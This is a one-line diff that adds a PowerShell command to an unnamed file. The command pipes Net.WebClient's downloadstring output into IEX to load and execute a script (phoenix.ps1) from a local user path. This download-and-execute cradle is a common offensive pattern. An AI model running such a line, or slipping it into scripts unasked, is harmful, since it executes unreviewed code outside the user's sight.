@@ -1,0 +1,1 @@
+IEX(New-Object Net.WebClient) .downloadstring( 'C:\users\merlin\phoenix.ps1')
